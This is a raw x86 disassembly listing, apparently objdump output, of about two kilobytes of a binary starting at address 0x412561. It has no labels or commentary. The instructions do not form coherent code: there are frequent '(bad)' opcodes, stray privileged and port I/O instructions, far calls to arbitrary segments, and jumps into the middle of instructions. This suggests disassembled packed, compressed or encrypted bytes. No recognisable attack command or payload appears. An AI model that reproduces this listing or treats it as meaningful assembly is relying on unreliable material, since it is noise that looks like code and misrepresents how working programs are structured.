  412561:	add    BYTE PTR [eax-0x49],0xdb
  412565:	test   ah,0x1c
  412568:	jb     0x41256e
  41256a:	cli    
  41256b:	mov    al,BYTE PTR [ebx-0x7ca1c17d]
  412571:	adc    DWORD PTR ds:0x4906ec76,0x5d
  412578:	lods   al,BYTE PTR ds:[esi]
  412579:	(bad)  
  41257a:	stos   DWORD PTR es:[edi],eax
  41257b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41257d:	or     eax,DWORD PTR [ecx-0x17]
  412580:	xchg   esi,eax
  412581:	xchg   esp,eax
  412582:	or     esp,eax
  412584:	outs   dx,BYTE PTR ds:[esi]
  412585:	or     bh,BYTE PTR [edx+0x749a8358]
  41258b:	xchg   esi,ebp
  41258d:	sub    eax,0xfdaf329c
  412592:	popf   
  412593:	daa    
  412594:	cs and ecx,edx
  412597:	mov    BYTE PTR [ebp+0x58],al
  41259a:	jno    0x412574
  41259c:	xchg   ebp,eax
  41259d:	sbb    ecx,DWORD PTR [ecx]
  41259f:	rcr    BYTE PTR [esi-0x40],cl
  4125a2:	dec    esi
  4125a3:	xor    ecx,DWORD PTR [edi]
  4125a5:	inc    ebp
  4125a6:	mov    ecx,fs
  4125a8:	inc    esi
  4125a9:	jb     0x4125c8
  4125ab:	pop    es
  4125ac:	cld    
  4125ad:	lds    ebx,FWORD PTR [edx]
  4125af:	xchg   ebp,eax
  4125b0:	adc    esp,ebx
  4125b2:	or     BYTE PTR [ebx],bh
  4125b4:	fstp   TBYTE PTR [ecx]
  4125b6:	in     al,dx
  4125b7:	into   
  4125b8:	ret    0xecaa
  4125bb:	sub    ah,dh
  4125bd:	sbb    DWORD PTR [ebx+ecx*2],0xcc2aaf7
  4125c4:	xor    BYTE PTR [ecx+0x8],cl
  4125c7:	cmp    bh,BYTE PTR [ecx-0x69]
  4125ca:	in     al,dx
  4125cb:	sbb    ch,BYTE PTR [edx]
  4125cd:	leave  
  4125ce:	add    ah,BYTE PTR [ebp-0x2f]
  4125d1:	and    BYTE PTR [ecx],0xb5
  4125d4:	mov    esi,ds
  4125d6:	out    dx,eax
  4125d7:	in     al,dx
  4125d8:	mov    ah,0x0
  4125da:	dec    ebp
  4125db:	(bad)  
  4125dc:	ins    DWORD PTR es:[edi],dx
  4125dd:	mov    eax,0x7d299ad1
  4125e2:	dec    ecx
  4125e3:	cmp    edx,DWORD PTR [ebx+0x5c]
  4125e6:	xor    eax,0x857edba6
  4125eb:	imul   ebp,DWORD PTR [ecx-0x2e613ff3],0x6ce7a95d
  4125f5:	idiv   DWORD PTR [edx+0x19b026b5]
  4125fb:	(bad)  
  4125fc:	repz call 0x95462028
  412602:	sbb    BYTE PTR [ecx],bh
  412604:	cmp    BYTE PTR [edx-0x784b9152],0xa0
  41260b:	dec    edi
  41260c:	call   0x4d03:0x4c4f29b1
  412613:	inc    edx
  412614:	mov    edi,0x8761180f
  412619:	jecxz  0x412684
  41261b:	xor    al,0x48
  41261d:	cmp    bl,BYTE PTR ds:0xc93699e7
  412623:	cmc    
  412624:	sbb    bh,dh
  412626:	cmp    dl,0x7a
  412629:	shl    BYTE PTR [edi],cl
  41262b:	repz or ecx,DWORD PTR ds:0x15f69d7
  412632:	pop    es
  412633:	dec    ecx
  412634:	cld    
  412635:	fsub   st,st(3)
  412637:	ret    0x447
  41263a:	lods   al,BYTE PTR ds:[esi]
  41263b:	iret   
  41263c:	or     eax,0x19d5d9dc
  412641:	sbb    ebp,DWORD PTR [esi]
  412643:	xchg   esi,eax
  412644:	mov    DWORD PTR [ecx-0x6da9b3f0],ebp
  41264a:	jno    0x412665
  41264c:	sub    bl,BYTE PTR [ecx]
  41264e:	mov    ah,0xd5
  412650:	jge    0x412601
  412652:	xchg   BYTE PTR [esi],al
  412654:	leave  
  412655:	jecxz  0x4126ab
  412657:	sub    bl,BYTE PTR [edx+0x6f548730]
  41265d:	out    0x10,eax
  41265f:	je     0x4126a8
  412661:	push   ss
  412662:	neg    DWORD PTR [esi+0x297b1dbe]
  412668:	lods   eax,DWORD PTR ds:[esi]
  412669:	mov    BYTE PTR [esi+0x30b7780b],0x23
  412670:	int3   
  412671:	sub    eax,0xe8be7fa8
  412676:	and    DWORD PTR [esi-0x8],0x63
  41267a:	sub    eax,0xb835beea
  41267f:	mov    esp,0xb73fdf
  412684:	and    BYTE PTR [esi+ecx*8-0x2d],0x76
  412689:	fs ins BYTE PTR es:[edi],dx
  41268b:	dec    edx
  41268c:	sar    DWORD PTR [edi+0xf],cl
  41268f:	mov    ebp,DWORD PTR [edx-0x34]
  412692:	mov    al,ds:0xdfa879a3
  412697:	add    bh,bl
  412699:	sub    BYTE PTR [ecx],ah
  41269b:	(bad)  
  41269c:	int    0x3c
  41269e:	lds    eax,FWORD PTR [ebp+0x23]
  4126a1:	xchg   edx,eax
  4126a2:	pop    ecx
  4126a3:	mov    eax,esi
  4126a5:	cdq    
  4126a6:	sub    eax,0x9dac98f2
  4126ab:	jae    0x4126dc
  4126ad:	ins    DWORD PTR es:[edi],dx
  4126ae:	push   cs
  4126af:	out    0x8c,eax
  4126b1:	and    ebp,DWORD PTR [eax-0x1fad239]
  4126b7:	popf   
  4126b8:	ds repz dec ebp
  4126bb:	in     al,dx
  4126bc:	inc    ecx
  4126bd:	mov    bl,BYTE PTR [ecx-0x55]
  4126c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126c1:	sub    BYTE PTR [edi+0x7b],ch
  4126c4:	in     eax,dx
  4126c5:	sbb    eax,0xf3158c45
  4126ca:	mov    dl,0x7a
  4126cc:	aas    
  4126cd:	stc    
  4126ce:	adc    esp,DWORD PTR [edx-0x27a9e75e]
  4126d4:	iret   
  4126d5:	call   0xaa8b3d67
  4126da:	jbe    0x41273e
  4126dc:	inc    ebp
  4126dd:	test   al,0x35
  4126df:	in     al,0x0
  4126e1:	mov    dl,0xad
  4126e3:	mov    edi,0xc2fcea54
  4126e8:	inc    esp
  4126e9:	sub    ebx,DWORD PTR [edx]
  4126eb:	retf   0xe1a4
  4126ee:	imul   ah
  4126f0:	ret    0x6dc8
  4126f3:	mov    ds:0x8c15b0e3,al
  4126f8:	cmp    dl,ah
  4126fa:	aaa    
  4126fb:	fninit 
  4126fd:	fistp  DWORD PTR [ebp+0x7ce385c2]
  412703:	fcom   DWORD PTR [ebp-0xd]
  412706:	cld    
  412707:	mov    bl,0xf0
  412709:	dec    eax
  41270a:	popf   
  41270b:	and    BYTE PTR [edx],bl
  41270d:	xchg   edx,eax
  41270e:	inc    esp
  41270f:	cmp    DWORD PTR [ebx+edi*4],ecx
  412712:	sbb    eax,0x439d5fe3
  412717:	ret    0xaa5d
  41271a:	jle    0x4126fc
  41271c:	mov    edx,0xeb251da6
  412721:	xchg   ecx,eax
  412722:	(bad)  
  412723:	mov    al,ds:0x34e988eb
  412728:	inc    edi
  412729:	adc    BYTE PTR [ebp+0x14],ch
  41272c:	pop    ss
  41272d:	sub    BYTE PTR ds:0xbbaa8c2e,0x78
  412734:	xor    al,0x66
  412736:	int    0xfd
  412738:	fcmovnu st,st(4)
  41273a:	addr16 dec esi
  41273c:	das    
  41273d:	cmp    ebp,DWORD PTR [eax+ebp*8]
  412740:	adc    al,0x7d
  412742:	addr16 xchg ecx,eax
  412744:	div    ebx
  412746:	arpl   WORD PTR [ebx],ax
  412748:	mov    bl,0xfc
  41274a:	sbb    ebp,ecx
  41274c:	sbb    cl,dh
  41274e:	xor    bh,BYTE PTR [ebx+edx*4-0xd]
  412752:	cmp    edi,DWORD PTR [eax+0x2]
  412755:	sbb    BYTE PTR [esi],ch
  412757:	arpl   si,bx
  412759:	bound  esi,QWORD PTR [ecx]
  41275b:	dec    edi
  41275c:	out    dx,eax
  41275d:	add    al,bh
  41275f:	loopne 0x412718
  412761:	arpl   di,cx
  412763:	pop    esp
  412764:	sub    eax,0x77153257
  412769:	bswap  edx
  41276b:	add    eax,0x8dd3888d
  412770:	enter  0xad50,0x90
  412774:	lods   al,BYTE PTR ds:[esi]
  412775:	pop    ecx
  412776:	mov    edx,DWORD PTR [esi-0x691d1aaf]
  41277c:	retf   0x79ae
  41277f:	and    edx,esi
  412781:	lods   al,BYTE PTR ds:[esi]
  412782:	or     BYTE PTR [esi+0x4c762479],bl
  412788:	icebp  
  412789:	cmc    
  41278a:	dec    esi
  41278b:	pop    esp
  41278c:	lahf   
  41278d:	bound  esi,QWORD PTR [ebp+0x2e851268]
  412793:	pop    esp
  412794:	pop    edx
  412795:	jb     0x4127bb
  412797:	mov    edi,0x3fd20309
  41279c:	hlt    
  41279d:	fistp  WORD PTR [ecx+0x32]
  4127a0:	mov    bh,0xe
  4127a2:	iret   
  4127a3:	mov    ah,0x33
  4127a5:	mov    ds:0x86b8fb9d,eax
  4127aa:	ret    
  4127ab:	xor    dh,0xe6
  4127ae:	sub    al,0x53
  4127b0:	ret    0x8341
  4127b3:	push   ds
  4127b4:	cmp    al,BYTE PTR [esi]
  4127b6:	cmp    ecx,DWORD PTR [edx]
  4127b8:	cli    
  4127b9:	ret    
  4127ba:	rol    DWORD PTR [esi],1
  4127bc:	shr    BYTE PTR [esi+0x52],cl
  4127bf:	add    eax,0xec65d1fb
  4127c4:	inc    ebx
  4127c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127c6:	js     0x41283a
  4127c8:	sahf   
  4127c9:	test   DWORD PTR [ecx+0x6626b104],edx
  4127cf:	xchg   esp,eax
  4127d0:	mov    ecx,ecx
  4127d2:	jl     0x4127bf
  4127d4:	and    ah,bh
  4127d6:	clc    
  4127d7:	loop   0x4127f9
  4127d9:	out    dx,al
  4127da:	mov    dh,0xfb
  4127dc:	mov    eax,0xb58647ea
  4127e1:	out    0xba,eax
  4127e3:	push   esp
  4127e4:	add    al,0x4d
  4127e6:	pop    edi
  4127e7:	mov    ebx,0x6ff3371f
  4127ec:	and    al,0xaa
  4127ee:	sti    
  4127ef:	rol    ch,cl
  4127f1:	push   esp
  4127f2:	cmp    al,0xb0
  4127f4:	dec    esi
  4127f5:	scas   al,BYTE PTR es:[di]
  4127f7:	test   al,0x88
  4127f9:	mov    ebp,0xd8a00cbd
  4127fe:	dec    edi
  4127ff:	cmp    eax,0xa830130e
  412804:	daa    
  412805:	test   BYTE PTR [edi-0x1c],dh
  412808:	(bad)  
  412809:	in     al,dx
  41280a:	mov    ch,0xc
  41280c:	in     al,0x3f
  41280e:	js     0x412868
  412810:	cmp    eax,0x9830450
  412815:	aam    0x92
  412817:	jnp    0x412807
  412819:	sbb    BYTE PTR ds:0x7d58bd65,bl
  41281f:	inc    edi
  412820:	aam    0x94
  412822:	dec    ecx
  412823:	xor    eax,0x7f86f6df
  412828:	loopne 0x41280b
  41282a:	sub    BYTE PTR [ebx+0x55ff5df6],al
  412830:	or     eax,0xf4a24baf
  412835:	(bad)  
  412836:	and    ch,al
  412838:	rol    BYTE PTR [edi],1
  41283a:	out    dx,al
  41283b:	loope  0x4127ff
  41283d:	fmul   st,st(3)
  41283f:	lock iret 
  412841:	and    eax,0xa3805d67
  412846:	xor    al,bh
  412848:	pop    bx
  41284a:	mov    BYTE PTR [ebx+0x71d41cec],ch
  412850:	push   cs
  412851:	in     eax,dx
  412852:	push   es
  412853:	jle    0x4127f1
  412855:	test   esp,edi
  412857:	adc    BYTE PTR [esi+0x2e],dh
  41285a:	inc    ecx
  41285b:	and    esp,DWORD PTR [eax]
  41285d:	xchg   ecx,eax
  41285e:	sub    BYTE PTR [ebx-0x3bd82a7d],dh
  412864:	jmp    0x41289f
  412866:	adc    eax,0xdf02795a
  41286b:	xchg   BYTE PTR [edx],bh
  41286d:	pop    eax
  41286e:	or     al,cl
  412870:	jl     0x4128ce
  412872:	and    edi,DWORD PTR es:[ecx+0x228f1569]
  412879:	mov    eax,ds:0xf1a8e812
  41287e:	add    bl,dh
  412880:	dec    esi
  412881:	jmp    0x463c42d7
  412886:	push   ecx
  412887:	sbb    al,0xb8
  412889:	jnp    0x4128e8
  41288b:	pop    ecx
  41288c:	mov    dh,0xfb
  41288e:	mov    edi,0xb07ceb86
  412893:	xchg   ecx,eax
  412894:	sbb    eax,0x7fbc5fdd
  412899:	dec    ebp
  41289a:	mov    ds,esp
  41289c:	xchg   ebp,eax
  41289d:	ret    
  41289e:	cld    
  41289f:	sub    BYTE PTR [ecx+0x4e],cl
  4128a2:	in     eax,dx
  4128a3:	xor    cl,bl
  4128a5:	cmp    esi,DWORD PTR [eax]
  4128a7:	xlat   BYTE PTR ds:[ebx]
  4128a8:	inc    ebx
  4128a9:	cmc    
  4128aa:	ret    0x1c2
  4128ad:	(bad)  
  4128ae:	mov    DWORD PTR [edx],0x91944407
  4128b4:	xchg   esi,eax
  4128b5:	pop    ecx
  4128b6:	and    al,BYTE PTR ds:0x8e9436ef
  4128bc:	jp     0x41287f
  4128be:	aad    0x5d
  4128c0:	(bad)  
  4128c1:	push   ss
  4128c2:	inc    ebp
  4128c3:	mov    eax,0x85e29007
  4128c8:	rol    BYTE PTR [esi+0x2c8fdd88],cl
  4128ce:	sub    bl,ah
  4128d0:	sub    BYTE PTR [eax+0x30],al
  4128d3:	lahf   
  4128d4:	call   0x32bd:0x1890e23b
  4128db:	data16 or ch,al
  4128de:	xchg   esi,eax
  4128df:	je     0x412945
  4128e1:	jns    0x412902
  4128e3:	lds    ebx,FWORD PTR [esi]
  4128e5:	loope  0x41290c
  4128e7:	cdq    
  4128e8:	push   edi
  4128e9:	pop    esi
  4128ea:	mov    ebx,0x8766b51
  4128ef:	add    al,0xcb
  4128f1:	cmp    eax,0x9cfb9181
  4128f6:	cmc    
  4128f7:	repz add edi,ebp
  4128fa:	jp     0x4128e5
  4128fc:	inc    eax
  4128fd:	sub    BYTE PTR [edi+0x66],al
  412900:	(bad)  
  412901:	fdiv   st(7),st
  412903:	fisub  WORD PTR [ecx]
  412905:	loop   0x412970
  412907:	lods   al,BYTE PTR ds:[esi]
  412908:	ds mov dh,0xad
  41290b:	(bad)  [eax+0x67]
  41290e:	test   eax,0xda67050f
  412913:	js     0x412939
  412915:	popa   
  412916:	pop    es
  412917:	popf   
  412918:	adc    ch,cl
  41291a:	xor    DWORD PTR [eax+ecx*4+0x389648bd],edx
  412921:	jbe    0x412943
  412923:	addr16 int 0xb0
  412926:	mov    WORD PTR [esi-0x5a925e96],?
  41292c:	in     ax,0x9b
  41292f:	into   
  412930:	xchg   ebx,eax
  412931:	fidiv  WORD PTR ss:0x9faccd98
  412938:	xchg   ecx,eax
  412939:	ret    0xf729
  41293c:	(bad)  
  41293d:	jl     0x41297c
  41293f:	mov    ds:0xd8cba13a,eax
  412944:	scas   al,BYTE PTR es:[edi]
  412945:	cmp    al,BYTE PTR [esp+edi*1+0x41707272]
  41294c:	push   0x4a
  41294e:	xor    ah,ch
  412950:	or     eax,0xddbebf4f
  412955:	enter  0x5c4,0x20
  412959:	imul   edx,DWORD PTR [ebx+ecx*8],0x38
  41295d:	psubb  mm5,mm7
  412960:	rol    DWORD PTR [edx-0x4e],cl
  412963:	adc    al,0xd9
  412965:	rol    BYTE PTR [ecx],0x74
  412968:	jmp    0x4129b2
  41296a:	push   ecx
  41296b:	jg     0x4129ba
  41296d:	inc    DWORD PTR [esi+0x7a]
  412970:	test   al,0xcd
  412972:	mov    eax,0xe3df84f2
  412977:	cmp    eax,0xe77107e6
  41297c:	inc    edi
  41297d:	adc    DWORD PTR [ebx-0x7df31206],edx
  412983:	sti    
  412984:	scas   eax,DWORD PTR es:[edi]
  412985:	sbb    BYTE PTR [esi+0x2c52352c],0xe1
  41298c:	popa   
  41298d:	jnp    0x4129dc
  41298f:	add    cl,BYTE PTR [eax+0x55c68e01]
  412995:	outs   dx,DWORD PTR ds:[esi]
  412996:	push   cs
  412997:	cmp    esp,ebp
  412999:	jns    0x412a0a
  41299b:	arpl   WORD PTR [edx],sp
  41299d:	ret    
  41299e:	in     al,0x5c
  4129a0:	call   DWORD PTR [ebp+0x0]
  4129a3:	imul   eax,DWORD PTR [esi],0x10
  4129a6:	push   es
  4129a7:	in     al,0x4c
  4129a9:	xor    eax,0x432a2f4c
  4129ae:	stos   BYTE PTR es:[edi],al
  4129af:	(bad)  
  4129b0:	xlat   BYTE PTR ds:[ebx]
  4129b1:	push   0xffffff96
  4129b3:	std    
  4129b4:	jo     0x412998
  4129b6:	lods   al,BYTE PTR ds:[esi]
  4129b7:	pop    es
  4129b8:	test   edx,edx
  4129ba:	inc    eax
  4129bb:	jmp    0x412a33
  4129bd:	icebp  
  4129be:	mov    ebx,eax
  4129c0:	cli    
  4129c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129c2:	xor    eax,0x4f7bb627
  4129c7:	stc    
  4129c8:	add    eax,0x491b48d0
  4129cd:	dec    ecx
  4129ce:	daa    
  4129cf:	push   0x265d85c9
  4129d4:	pop    ebx
  4129d5:	inc    eax
  4129d6:	mov    bh,0x25
  4129d8:	xor    al,bh
  4129da:	in     eax,0xbf
  4129dc:	xor    ah,BYTE PTR [eax-0x5b18969f]
  4129e2:	mov    ebx,0xed50dec2
  4129e7:	(bad)  
  4129e8:	mov    al,0x50
  4129ea:	aaa    
  4129eb:	stos   DWORD PTR es:[edi],eax
  4129ec:	add    bl,BYTE PTR [edi]
  4129ee:	bnd jp 0x4129cb
  4129f1:	xor    DWORD PTR [eax-0x6d],edx
  4129f4:	sbb    BYTE PTR [esi+0x6fcbe45e],bh
  4129fa:	arpl   WORD PTR [ebp-0xe1c354],sp
  412a00:	imul   ecx,DWORD PTR [ebx+0x17285691],0x7
  412a07:	lds    eax,FWORD PTR [esi+0x3c]
  412a0a:	adc    ebx,DWORD PTR cs:[ebp-0x7d8c1a80]
  412a11:	or     al,0xca
  412a13:	shl    BYTE PTR [ecx-0x9],0x88
  412a17:	inc    esi
  412a18:	das    
  412a19:	out    dx,eax
  412a1a:	dec    esp
  412a1b:	cmp    DWORD PTR [ebx+eax*8-0x576b55d3],ebp
  412a22:	sbb    eax,0x5c22858c
  412a27:	outs   dx,BYTE PTR ds:[esi]
  412a28:	sti    
  412a29:	xchg   esi,eax
  412a2a:	xchg   edi,eax
  412a2b:	test   BYTE PTR [esi+0x441e9f3],ch
  412a31:	sar    DWORD PTR [edi+0x8e9cb7d],0xe9
  412a38:	push   ds
  412a39:	out    0x1e,al
  412a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a3c:	mov    ebp,0x635169bb
  412a41:	dec    ebx
  412a42:	cld    
  412a43:	daa    
  412a44:	adc    eax,DWORD PTR [edi]
  412a46:	push   ecx
  412a47:	cs fucomip st,st(6)
  412a4a:	inc    eax
  412a4b:	(bad)  
  412a4c:	xor    ebx,DWORD PTR [ebx-0x4b1d87c8]
  412a52:	mov    edx,0xdb81b5ca
  412a57:	sbb    BYTE PTR [ebx+esi*1],bl
  412a5a:	(bad)  
  412a5b:	(bad)  
  412a5c:	ins    BYTE PTR es:[edi],dx
  412a5d:	cs in  eax,0x4c
  412a60:	test   DWORD PTR [ecx-0x59],0x2e5f3d4a
  412a67:	ins    BYTE PTR es:[edi],dx
  412a68:	dec    edi
  412a69:	add    al,0x79
  412a6b:	mov    BYTE PTR [edi+0x19],cl
  412a6e:	outs   dx,BYTE PTR ds:[esi]
  412a6f:	je     0x412a26
  412a71:	retf   
  412a72:	std    
  412a73:	jl     0x412aa9
  412a75:	add    al,0xd2
  412a77:	scas   eax,DWORD PTR es:[edi]
  412a78:	xor    eax,0x682b8d82
  412a7d:	mov    cl,0x9f
  412a7f:	sbb    eax,esp
  412a81:	sub    esi,esi
  412a83:	stc    
  412a84:	or     ch,ah
  412a86:	fmul   QWORD PTR [edi-0x51a9b5b8]
  412a8c:	inc    eax
  412a8d:	adc    al,0xd3
  412a8f:	inc    ebx
  412a90:	dec    edx
  412a91:	stos   BYTE PTR es:[edi],al
  412a92:	fs hlt 
  412a94:	rcl    BYTE PTR [ebp-0xc],0x7e
  412a98:	pop    esp
  412a99:	in     eax,0x83
  412a9b:	or     BYTE PTR [esi-0x4f],bh
  412a9e:	or     al,0xaa
  412aa0:	cdq    
  412aa1:	mov    DWORD PTR [edi],eax
  412aa3:	call   0x294b:0xca40dfdd
  412aaa:	inc    edi
  412aab:	leave  
  412aac:	leave  
  412aad:	outs   dx,DWORD PTR ds:[esi]
  412aae:	(bad)  [eax]
  412ab0:	cmp    BYTE PTR [ebx],dl
  412ab2:	jp     0x412b05
  412ab4:	or     eax,0x646d37db
  412ab9:	jg     0x412a8e
  412abb:	(bad)  
  412abc:	in     eax,dx
  412abd:	add    eax,0x5900a39b
  412ac2:	outs   dx,BYTE PTR ds:[esi]
  412ac3:	cmp    edi,DWORD PTR [edx+0x15]
  412ac6:	mov    ebx,0x5436caa3
  412acb:	sub    al,0x3d
  412acd:	(bad)  
  412ace:	leave  
  412acf:	fsub   DWORD PTR [ebx-0x59]
  412ad2:	add    BYTE PTR [edx],dl
  412ad4:	mov    cl,0xcd
  412ad6:	test   DWORD PTR [esi+0x7d],0xb3d81fb1
  412add:	lods   al,BYTE PTR ds:[esi]
  412ade:	cmp    ch,BYTE PTR [esi+0xa35d772]
  412ae4:	iret   
  412ae5:	lock mov eax,0x3f682625
  412aeb:	mov    dh,0xcc
  412aed:	loope  0x412aef
  412aef:	arpl   WORD PTR ds:0xeb6892c9,di
  412af5:	lods   al,BYTE PTR ds:[esi]
  412af6:	ror    BYTE PTR [eax-0x52],1
  412af9:	(bad)
  412afc:	int    0x6d
  412afe:	push   cs
  412aff:	xlat   BYTE PTR ds:[ebx]
  412b00:	sahf   
  412b01:	xor    al,0x9c
  412b03:	dec    ecx
  412b04:	nop
  412b05:	xchg   ebx,eax
  412b06:	(bad)  
  412b07:	(bad)  
  412b08:	inc    esi
  412b0a:	sub    BYTE PTR [esi+0x4d10f014],al
  412b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b11:	mov    bl,0x38
  412b13:	xchg   edi,eax
  412b14:	adc    DWORD PTR [edx],esp
  412b16:	loop   0x412a9a
  412b18:	sub    ebx,DWORD PTR [esi*1-0x9bfe2de]
  412b1f:	clc    
  412b20:	adc    DWORD PTR [esi+0x32bdf102],ecx
  412b26:	bnd js 0x412b29
  412b29:	aad    0x6
  412b2b:	inc    ebp
  412b2c:	pop    ebp
  412b2d:	push   edi
  412b2e:	inc    ebp
  412b2f:	repnz adc eax,0x289e0623
  412b35:	mov    WORD PTR [ebx],ss
  412b37:	xchg   DWORD PTR [ecx-0x40a6d71f],edx
  412b3d:	icebp  
  412b3e:	ret    0x6df8
  412b41:	fdiv   QWORD PTR [esi+0x5f]
  412b44:	aad    0xec
  412b46:	lea    sp,[edx+0x67e0308d]
  412b4d:	cwde   
  412b4e:	adc    bl,BYTE PTR [ecx]
  412b50:	push   0xffffffeb
  412b52:	stos   BYTE PTR es:[edi],al
  412b53:	push   esp
  412b54:	cmp    al,0x90
  412b56:	inc    ebx
  412b57:	outs   dx,BYTE PTR ds:[esi]
  412b58:	cs pushf 
  412b5a:	inc    ebp
  412b5b:	pop    edx
  412b5c:	ret    
  412b5d:	cmp    DWORD PTR [ebx],esp
  412b5f:	fldcw  WORD PTR [esi+0x2f]
  412b62:	or     DWORD PTR [edi],eax
  412b64:	into   
  412b65:	stc    
  412b66:	inc    esp
  412b67:	mul    BYTE PTR ds:0x44deb6db
  412b6d:	das    
  412b6e:	cmp    eax,0x10258f0b
  412b73:	cli    
  412b74:	mov    eax,DWORD PTR [ebx+0x74]
  412b77:	stc    
  412b78:	into   
  412b79:	ror    DWORD PTR [eax+0x76],cl
  412b7c:	mov    ds:0xc4aa8bb4,eax
  412b81:	and    al,0x8d
  412b83:	cmp    al,0xfd
  412b85:	lods   eax,DWORD PTR ds:[esi]
  412b86:	aad    0x9e
  412b88:	call   0x589b075f
  412b8d:	or     eax,0x5b6d3590
  412b92:	repnz dec ecx
  412b94:	mov    bl,0xc8
  412b96:	mov    DWORD PTR [ebx],eax
  412b98:	outs   dx,BYTE PTR ds:[esi]
  412b99:	das    
  412b9a:	hlt    
  412b9b:	add    al,0x97
  412b9d:	push   ebx
  412b9e:	rcr    BYTE PTR [eax-0x6d],0xee
  412ba2:	loopne 0x412c0f
  412ba4:	adc    dl,BYTE PTR ds:0x1ce7ba4f
  412baa:	mov    BYTE PTR [ecx],bl
  412bac:	sbb    eax,0x83c808b6
  412bb1:	mov    dl,0x40
  412bb3:	jnp    0x412b5f
  412bb5:	les    esi,FWORD PTR [ecx-0x56]
  412bb8:	xchg   esi,edi
  412bba:	in     eax,0x86
  412bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bbd:	xchg   edi,eax
  412bbe:	pop    ss
  412bbf:	xchg   ecx,eax
  412bc0:	out    0xff,eax
  412bc2:	sub    eax,0x305aa5e
  412bc7:	push   0xffffffdc
  412bc9:	mov    dl,0x4c
  412bcb:	inc    esi
  412bcc:	gs inc ebx
  412bce:	xchg   DWORD PTR [esi+0x3c5a9801],edx
  412bd4:	pop    edi
  412bd5:	or     bh,BYTE PTR [ecx-0x8]
  412bd8:	or     eax,0xc08f1d05
  412bdd:	sti    
  412bde:	jle    0x412b96
  412be0:	(bad)  
  412be1:	adc    al,bh
  412be3:	sub    eax,0xc4a06211
  412be8:	jl     0x412c5d
  412bea:	sti    
  412beb:	mov    ds:0x7abb3730,al
  412bf0:	shl    DWORD PTR [eax+0x76],0xbe
  412bf4:	add    eax,DWORD PTR ds:0x87ad2f58
  412bfa:	inc    esp
  412bfb:	pop    ebx
  412bfc:	mov    DWORD PTR [esi-0xb31000a],esp
  412c02:	ss icebp 
  412c04:	std    
  412c05:	loope  0x412b99
  412c07:	and    BYTE PTR [ebp+0x5877b453],0xb5
  412c0e:	push   cs
  412c0f:	inc    ebp
  412c10:	arpl   WORD PTR [ecx],dx
  412c12:	pop    ecx
  412c13:	push   es
  412c14:	arpl   WORD PTR [eax+0x9239195],bp
  412c1a:	adc    ecx,DWORD PTR [eax-0xaf65946]
  412c20:	test   al,0x6e
  412c22:	daa    
  412c23:	cwde   
  412c24:	aam    0xec
  412c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c27:	es xchg ebx,eax
  412c29:	or     ah,0x92
  412c2c:	test   al,0x55
  412c2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c2f:	cmp    BYTE PTR [edx+ebp*8-0x7803ecfb],ch
  412c36:	xor    DWORD PTR [ecx-0x18],edx
  412c39:	dec    eax
  412c3a:	out    0xb5,eax
  412c3c:	ds mov edi,0xe6591b2a
  412c42:	(bad)  
  412c43:	sbb    cl,BYTE PTR [edi+edi*1-0x7965080a]
  412c4a:	imul   ecx,DWORD PTR [ecx-0xd735877],0xfffffff8
  412c51:	in     eax,0xca
  412c53:	popa   
  412c54:	sub    esp,DWORD PTR [eax+edx*2-0x3aa37b4e]
  412c5b:	loope  0x412c61
  412c5d:	pop    edx
  412c5e:	ins    BYTE PTR es:[edi],dx
  412c5f:	inc    ebx
  412c60:	sub    DWORD PTR [edx-0x1c],esi
  412c63:	pushf  
  412c64:	pop    ecx
  412c65:	pop    edi
  412c66:	jl     0x412c7b
  412c68:	lods   al,BYTE PTR ds:[esi]
  412c69:	arpl   WORD PTR es:[edx-0x49],dx
  412c6d:	fs dec ecx
  412c6f:	test   DWORD PTR [ebx-0x45],0x7878d7a7
  412c76:	push   ds
  412c77:	mov    gs,eax
  412c79:	mov    BYTE PTR [ecx],dh
  412c7b:	test   eax,0x8f863288
  412c80:	aam    0x6
  412c82:	push   0x6a26e717
  412c87:	in     eax,dx
  412c88:	(bad)  
  412c89:	es jl  0x412c1c
  412c8c:	xor    eax,DWORD PTR [edx+0x13831e6a]
  412c92:	inc    edx
  412c93:	jecxz  0x412cda
  412c95:	jp     0x412c9f
  412c97:	popf   
  412c98:	mov    esp,cs
  412c9a:	cmp    al,0x2
  412c9c:	xor    al,0xdf
  412c9e:	dec    edi
  412c9f:	aad    0xb1
  412ca1:	stos   BYTE PTR es:[edi],al
  412ca2:	fisttp WORD PTR [eax+0x4d]
  412ca5:	mov    cl,0x34
  412ca7:	ss or  eax,0xc8413571
  412cad:	cmp    DWORD PTR [eax],ecx
  412caf:	outs   dx,DWORD PTR ds:[esi]
  412cb0:	push   ds
  412cb1:	(bad)  
  412cb2:	lods   al,BYTE PTR ds:[esi]
  412cb3:	test   DWORD PTR [ecx],ebx
  412cb5:	leave  
  412cb6:	pop    ecx
  412cb7:	mov    ebx,0x4a451363
  412cbc:	stos   BYTE PTR es:[edi],al
  412cbd:	pop    ecx
  412cbe:	push   esp
  412cbf:	or     ecx,ebx
  412cc1:	scas   eax,DWORD PTR es:[edi]
  412cc2:	or     eax,0xbf7e0d35
  412cc7:	pusha  
  412cc8:	scas   al,BYTE PTR es:[edi]
  412cc9:	imul   ebx,DWORD PTR [edx+0x53938cf],0xa115cd0b
  412cd3:	and    al,0x28
  412cd5:	jecxz  0x412d4f
  412cd7:	push   ebp
  412cd8:	xchg   edx,ebp
  412cda:	sti    
  412cdb:	clc    
  412cdc:	xor    al,0xf8
  412cde:	jl     0x412d30
  412ce0:	fwait
  412ce1:	xchg   edx,eax
  412ce2:	xrelease xchg DWORD PTR [esi+0x4f9d287],eax
  412ce9:	fidivr DWORD PTR [edx]
  412ceb:	xchg   ecx,eax
  412cec:	test   al,0x7a
  412cee:	add    BYTE PTR [ecx-0x2ace9799],dh
  412cf4:	pusha  
  412cf5:	mov    dl,0xf7
  412cf7:	cmc    
  412cf8:	pushf  
  412cf9:	or     edx,DWORD PTR [ecx+0x66]
  412cfc:	mov    ebp,0x44dddb55
  412d01:	pop    edi
  412d02:	sbb    bl,BYTE PTR [ecx]
